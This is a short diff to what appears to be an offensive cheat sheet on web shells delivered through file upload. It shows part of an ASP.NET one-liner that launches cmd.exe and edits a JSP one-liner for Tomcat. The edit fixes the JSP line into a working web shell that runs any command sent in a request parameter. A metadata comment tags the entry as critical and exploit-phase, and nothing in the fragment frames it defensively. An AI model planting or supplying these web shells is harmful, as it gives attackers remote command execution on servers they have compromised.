@@ -219,7 +219,7 @@ echo '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c 
 JSP shell for Tomcat.
 
 ```bash
-echo '<%Runtime.getRuntime().shellRun(request.getParameter("c"));%>'
+echo '<%Runtime.getRuntime().exec(request.getParameter("c"));%>'
 ```
 
 <!-- meta: risk=critical | phase=exploit | tags=upload,jsp,tomcat -->
